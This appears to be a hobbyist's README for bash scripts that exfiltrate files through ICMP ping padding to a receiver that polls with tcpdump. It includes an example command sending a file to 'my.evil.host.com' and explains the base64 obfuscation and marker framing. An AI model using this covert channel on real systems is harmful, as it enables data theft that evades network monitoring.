<pre>
Just testing exfiltration through ping packets with bash. By no means anything complete, nor pretty nor expert level. Just some beginner's testing in bash.

This test set was running on a private VM (sender) and AWS EC2 (receiver)

Not safe at all, as you need access to ping on the sending side and tcpdump on the receiving end, running things as sudo etc.

########
#MANUAL#
########
##RECEIVER##
#1: create the cronfile on your AWS or whatever you're running the receiver on
#2: start rolling the cron
#3: cron launches beefpoller.sh which will poll for new packets. Packets of interest are recognized when containing the padding data:

"beef15f00d1100FF"
#4: polling stops when the padding data contains:

"dead beef"
##SENDER##
#1: pinger.sh takes two arguments; first one being the file to exfiltrate and the second one is the host to exfiltrate data to:

./pinger.sh topkek.txt my.evil.host.com
#2: converts the data to base64, then to binary and is then pushed to 16bit array, then sends the init packet containing the "beef15f00d1100FF", then the data 16bits at a time and finally the end of transmit packet containing "dead beef"

##Most likely an awful way of doing things, slow(*) as *insertbadword* and amateurish. I take no resposibility nor give any warranties.
##Comments are always welcome.
(*) Would be faster to send the data out in hex, but just as a really minor obfuscation it's first encoded to b64 and then converted to bin
</pre>
